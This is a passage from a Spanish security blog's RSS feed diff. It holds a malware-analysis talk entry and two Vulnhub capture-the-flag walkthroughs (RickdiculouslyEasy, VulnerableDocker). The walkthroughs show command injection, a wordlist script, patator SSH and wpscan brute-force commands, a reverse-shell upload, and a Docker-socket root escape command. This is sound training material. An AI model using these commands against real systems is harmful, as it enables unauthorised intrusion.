+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/BG4D8S4GW0Y&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;demostraciones-android&quot;&gt;Demostraciones Android&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Análisis de malware bancario&lt;/strong&gt;&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Wr040FUM6XU&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h1 id=&quot;material&quot;&gt;Material&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://mega.nz/#!k1hU3bCB!gqjWQ06hH36oXdlVhHD05GMbd7K2EUg9lltkm5X7NEs&quot;&gt;OVA Android&lt;/a&gt;  Credenciales –&amp;gt; android : android&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://mega.nz/#!po5inALB!4v6v9BrnxIjRmXFrNe8Vx-O_bJuJwbkp_9UHxdMb4uM&quot;&gt;OVA Windows&lt;/a&gt;  Sin contraseña&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;algunas-referencias&quot;&gt;Algunas referencias:&lt;/h1&gt;
+
+&lt;h2 id=&quot;unpacking&quot;&gt;Unpacking&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.virusbulletin.com/virusbulletin/2012/04/quick-reference-manual-unpacking&quot;&gt;Virusbulletin Manual unpacking I&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.virusbulletin.com/virusbulletin/2012/07/quick-reference-manual-unpacking-ii&quot;&gt;Virusbulletin Manual unpacking II&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf&quot;&gt;Blackhat 2007 The art of Unpacking&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;virtual-machine-detectors&quot;&gt;Virtual Machine Detectors&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/a0rtega/pafish&quot;&gt;Pafish&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/LordNoteworthy/al-khaser&quot;&gt;Al-khaser&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;android-emulator-detector&quot;&gt;Android Emulator Detector&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/strazzere/anti-emulator&quot;&gt;Anti-emulator&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;android-deofuscator&quot;&gt;Android Deofuscator&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.apk-deguard.com/&quot;&gt;DeGuard&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Mon, 12 Mar 2018 11:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/malware/presentacion/2018/03/12/RootedCon-2018.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/malware/presentacion/2018/03/12/RootedCon-2018.html</guid>
+        
+        <category>malware</category>
+        
+        <category>presentacion</category>
+        
+        
+        <category>malware</category>
+        
+        <category>presentacion</category>
+        
+      </item>
+    
+      <item>
+        <title>Vulnhub RickdiculouslyEasy</title>
+        <description>&lt;h1 id=&quot;rickdiculouslyeasy&quot;&gt;RickdiculouslyEasy&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/&quot;&gt;https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; This is a fedora server vm, created with virtualbox.&lt;/p&gt;
+
+&lt;p&gt;It is a very simple Rick and Morty themed boot to root.&lt;/p&gt;
+
+&lt;p&gt;There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.&lt;/p&gt;
+
+&lt;p&gt;It’s designed to be a beginner ctf, if you’re new to pen testing, check it out!&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Nada más iniciar la máquina, podemos observar que nos indica la IP que ha asignado a la máquina y un puerto (https://172.16.199.128:9090) por lo que accedemos a través del navegador y nos encontramos con la primera flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_zeus.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{THERE IS NO ZEUS, IN YOUR FACE} - 10/130 puntos.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que la flag nos indica que no existe ningún framework Zeus, realizamos un escaneo de puertos para comprobar que servicios hay corriendo en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/nmap.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La salida de nmap nos indica que existe un FTP en el puerto 21 en el cuál se permite el login con el usuario anonymous y vemos que hay un fichero FLAG.txt.
+Entramos y vemos la segunda flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_ftp.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{Whoa this is unexpected} - 20/130 puntos.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Seguimos por el puerto 80 ya que vemos que hay un apache. Vemos que existe el fichero robots.txt que contiene varias entradas interesantes.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;They're Robots Morty! It's ok to shoot them! They're just Robots!
+
+/cgi-bin/root_shell.cgi
+/cgi-bin/tracertool.cgi
+/cgi-bin/*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Probamos ambas entradas y vemos que en tracertool se trata de una herramienta que ejecuta el comando traceroute sobre la entrada de usuario, por lo que intentamos realizar un command injection y vemos que es vulnerable. Intenamos mostrar el fichero /etc/host mediante el comand “cat” y vemos que han cambiado el binario por uno que muestra un gato.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/cat.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que utilizamos el comando more para visualizar el contenido del fichero y así poder ver que usuarios existen en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/command_injection.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que ya no hay más entradas en el fichero robots.txt decido lanzar un dirb para ver si conseguimos descubrir algún directorio o fichero interesante en el sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/dirb.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;el dirb nos muestra que existe la carpeta password, por lo que accedemos a ella y podemos ver dos ficheros:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/Dirlist_password.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Uno de ellos es una flag,por lo que la visitamos y ya tenemos otros 10 puntos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_password.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{ Yeah d- just dont do it.} 30/130 puntos.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;El otro fichero, es un fichero html que si vemos el codigo fuente podemos encontrar la contraseña “winter”&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Morty's Website&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--Password: winter--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Antes hemos visto en el fichero /etc/hosts que existia un usuario cuyo nombre era Summer, por lo que probamos a loguearnos en el servicio ssh del puerto 22222, ya que el del 22 es fake, con el usuario Summer y contraseña winter.&lt;/p&gt;
+
+&lt;p&gt;Yay!! ya tenemos acceso al servidor, y en el directorio del usuario Summer encontramos la siguiente flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_summer.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{Get off the high road Summer!} 40/130 puntos&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Mirando distintos directorios del servidor vemos que existen ficheros interesantes en los disintos homes de otros usuarios como puede ser Morty y RickSanchez, por lo que como solo tenemos permisos de lectura, vamos a bajarnos los ficheros a nuestra máquina para analizarlos. Para ello ejecutamos los siguientes comando scp.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp -P 22222  Summer@172.16.199.128:/home/Morty/Safe_Password.jpg .  
+scp -P 22222  Summer@172.16.199.128:/home/Morty/journal.txt.zip .  
+scp -P 22222  Summer@172.16.199.128:/home/RickSanchez/RICKS_SAFE/safe .  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Empezamos analizando el fichero journal.txt.zip y vemos que para descomprimirlo necesitamos una contraseña, por lo que pasamos a analizar el fichero Safe_Password.jpg.
+Sacando los strings de dicha imagen podemos obtener la contraseña del fichero zip.(MeeSeek)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/pass_zip.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Descomprimimos el fichero y obtenemos el fichero journal.txt cuyo contenido es&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos otra flag. 60/130 puntos.&lt;/p&gt;
+
+&lt;p&gt;Vamos ahora a por el otro fichero que nos hemos descargado, el binario safe. Lo ejecutamos y vemos que nos pide que pasemos un parámetro, por lo que ponemos el parámetro 131333 tal y como nos lo indican en la última flag encontrada y obtenemos la siguiente flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_safe.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{And Awwwaaaaayyyy we Go!} 80/130 puntos&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;En esta pista, el mensaje nos indica que para obtener la contraseña del usuario Rick tenemos que generar un diccionario con las siguientes caracteristicas:&lt;br /&gt;
+    - 1 letra mayuscula&lt;br /&gt;
+    - 1 número&lt;br /&gt;
+    - una palabra del nombre de la vieja banda de Rick&lt;/p&gt;
+
+&lt;p&gt;Buscamos el nombre de la antigua banda de Rick y vemos que el nombre es The Flesh Curtains&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/bad_name.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;por lo que elaboramos un pequeño script que cumpla todas las condiciones que tiene que tener la contraseña:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/env python  &lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;upercase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;numbers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0123456789&quot;&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;old_band&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Flesh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Curtains&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;  
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;passwords.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uper&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upercase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numbers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;one&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_band&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  
+                &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;one&lt;/span&gt;  
+                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con el diccionario generado,ahora lo único que queda es realizar fuerza bruta contra el servicio ssh con el usuario RickSanchez.Para ello utilizamos la tool patator y ejecutamos el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python patator.py ssh_login host=172.16.199.128 user=RickSanchez port=22222 password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.' &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás un rato la herramienta encuentra una contraseña valida (P7Curtains)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/patator_ssh.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos logueamos en el servicio ssh con el usuario RickSanchez y la contraseña encontrada mediante la fuerza bruta. Miramos dentro de la carpeta home del usuario RickSanchez
+y vemos que hay una carpeta con nombre “ThisDoesntContainAnyFlag” pero entramos por si acaso y efectivamente…ahí no hay ninguna flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/not_flag.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seguimos con la pista que nos habían proporcionado para generar el diccionario de contraseñas y recordamos la siguiente parte “also sudo is wheely good”, por lo que 
+ejecutamos “sudo -su root” y ponemos la misma contraseña que hemos utilizado para loguearnos en el ssh.&lt;/p&gt;
+
+&lt;p&gt;Ya somos usuario root. :D&lt;/p&gt;
+
+&lt;p&gt;Trás ello, mostramos la flag que se encuentra dentro de la carpeta root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/root_flag.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{Ionic Defibrillator} 30 puntos 110/130 puntos&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos quedan 20 puntos, que los conseguimos accediendo a los servicios que están en el puerto 60000.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/rickdiculously/flag_60000.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{Flip the pickle Morty!} 10 puntos 110/120 puntos.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y al puerto 13337 consiguiendo así los últimos 10 puntos que nos faltan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/Vulnhub/rickdiculously/flag_60000.png&quot; alt=&quot;_config.yml&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{TheFoundMyBackdoorMorty} 10 puntos 130/130 puntos.&lt;/code&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 09 Mar 2018 11:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2018/03/09/Rickdiculously-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2018/03/09/Rickdiculously-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Vulnhub VulnerableDocker Easy mode</title>
+        <description>&lt;h1 id=&quot;down-by-the-dockereasy-mode&quot;&gt;Down By The Docker(Easy mode)&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/vulnerable-docker-1,208/&quot;&gt;https://www.vulnhub.com/entry/vulnerable-docker-1,208/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; Down By The Docker
+Ever fantasized about playing with docker misconfigurations, privilege escalation, etc. within a container?&lt;/p&gt;
+
+&lt;p&gt;Download this VM, pull out your pentest hats and get started&lt;/p&gt;
+
+&lt;p&gt;We have 2 Modes:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;HARD: This would require you to combine your docker skills as well as your pen-testing skills to achieve host compromise.&lt;/li&gt;
+  &lt;li&gt;EASY: Relatively easier path, knowing docker would be enough to compromise the machine and gain root on the host machines.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We have planted 3 flag files across the various machines / systems that are available to you. Your mission if you choose to accept would be as following:&lt;/p&gt;
+
+&lt;p&gt;Identify all the flags (2 in total: flag_1 and flag_3) (flag_2 was inadvertently left out)&lt;/p&gt;
+
+&lt;p&gt;Gain id=0 shell access on the host machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Tal y como indica el enunciado hay que buscar 2 flags y conseguir root en la máquina, ya que una de ellas no se incluyo debido a un error.&lt;/p&gt;
+
+&lt;p&gt;Lo primero que hacemos, como en todas las máquinas es realizar un escaneo de puertos para comprobar que servicios hay corriendo en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/port_scanning.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay 3 puertos abiertos, el 22 (ssh) , el 2375 (unknown) y el 8000 (Apache)&lt;/p&gt;
+
+&lt;p&gt;Vamos a empezar por el Apache, como siempre.Ponemos la ip:puerto en el navegador y la primera imagen que vemos nos indica que se trata de un Wordpress.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/wordpress.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que se trata de un wordpress, vamos a hacer uso de la herramienta wpscan para comprobar si contiene vulnerabilidades por la que podamos ganar acceso.
+Para ellos ejecutamos el siguiente comando&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./wpscan.rb --url http://192.168.1.36:8000/ &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos muestra varia información sobre un posible SQLInjection, un XSS con autenticación, etc pero nada útil. Por lo que vamos a comprobar si podemos enumerar usuarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./wpscan.rb --url http://192.168.1.36:8000/ --enumerate u&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtenemos el usuario bob
+&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/username.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que tenemos el nombre de usuario vamos a intentar hacer bruteforce al login con el diccionario rockyout.txt para ver si tenemos suerte&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./wpscan.rb --url http://192.168.1.36:8000/ --wordlist /usr/share/wordlist/rockyou.txt  --username bob&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y efectivamente conseguimos encontrar la contraseña para el usuario bob, en este caso Password1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/password.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos conectamos al wordpress y dando una vuelta por los distintos Pages, themes y Post, nos encontramos con la primera flag que se encuentra en un borrador de los Post.
+&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/flag_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Subimos una reverse shell susituyendo uno de los ficheros 404 de los themes y nos conectamos a nuestra máquina host, pero trás un rato buscando ficheros con el bit suid activo o alguna forma de escalar privilegios abandonamos ese camino.&lt;/p&gt;
+
+&lt;p&gt;Volvemos a mirar el escaneo de puerto que habíamos hecho al principio y observamos que en el puerto 2375 no se ha podido comprobar que servicio está corriendo en él por lo que hacemos una pequeña búsqueda en google.&lt;/p&gt;
+
+&lt;p&gt;Dado que el título de la máquina es “Vulnerable Docker” buscamos por “Docker port 2375” y el primer enlace de google nos lleva a:
+&lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/dockerd/&quot;&gt;https://docs.docker.com/engine/reference/commandline/dockerd/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Donde la información importante es:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;If you need to access the Docker daemon remotely, you need to enable the tcp Socket. Beware that the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon - and should be secured either using the built in HTTPS encrypted socket, or by putting a secure web proxy in front of it. You can listen on port 2375 on all network interfaces with -H tcp://0.0.0.0:2375, or on a particular network interface using its IP address: -H tcp://192.168.59.103:2375. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que significa que hay un socket de docker escuchando en ese puerto, lo que nos permitirá ejecutar comandos docker.
+Hacemos la prueba para listar los containers que están activos como podemos ver en la siguiente imagen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/docker_socket.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y efectivamente funciona, por lo que vamos a ejecutar una imagen alpine lo que nos dará accesso root a la máquina.
+Para ello ejecutaremos el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker -H tcp://192.168.1.36:2375 run -itv /:/host alpine /bin/sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y como comprobamos en la siguiente imagen, somos root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo único que queda ya es buscar la otra flag que indicaba el enunciado, en este caso con nombre “flag_3”.
+La primera pista nos indicaba que estaba en los ficheros por lo que con un comando find la encontramos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/vulnerable_docker/easy/flag_3.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya hemos conseguido el objetivo de la máquina que era obtener las dos flags y ser usuario root. En la siguiente entrada resolveremos la máquina en el modo hard.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 24 Oct 2017 11:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/10/24/VulnerableDocker_Easymode.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/10/24/VulnerableDocker_Easymode.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>vulnhub</category>
+        
+        <category>notsosecure</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
